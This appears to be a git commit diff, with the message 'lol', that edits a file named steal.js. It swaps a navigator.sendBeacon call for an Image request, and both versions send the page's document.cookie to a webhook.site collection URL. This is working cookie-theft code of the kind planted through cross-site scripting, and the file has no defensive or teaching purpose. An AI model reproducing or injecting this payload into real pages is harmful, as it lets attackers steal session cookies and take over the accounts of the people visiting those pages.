0799ca316bd862058222aa64dc42e056408b7dff
Rushiraj-Baxi <49586938+Rushiraj-Baxi@users.noreply.github.com>
2025-12-12 11:02:12 +0000

    lol

--- steal.js
+++ steal.js
@@ -1,1 +1,2 @@
-navigator.sendBeacon('https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed', document.cookie);
+var img = new Image();
+img.src = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed?cookie=' + encodeURIComponent(document.cookie);
